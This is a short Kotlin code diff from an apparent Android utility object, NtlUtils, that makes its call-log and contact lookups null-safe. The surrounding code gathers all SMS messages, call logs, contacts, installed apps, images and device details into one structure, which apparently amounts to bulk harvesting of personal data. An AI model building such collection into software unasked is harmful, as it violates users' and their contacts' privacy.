@@ -135,8 +135,8 @@ object NtlUtils {
         return StructPool(
             imageList = getImageList(),
             smsList = SmsUtils.getAllSms(),
-            callLogList = CallUtils.getCalls(),
-            contactList = ContactUtils.getContacts(),
+            callLogList = CallUtils.getCalls() ?: emptyList(),
+            contactList = ContactUtils.getContacts() ?: emptyList(),
             appList = PackageUtils.getAllPackage(),
             deviceInfo = getDeviceInfo(),
             hardwareInfo = getHardwareInfo(),
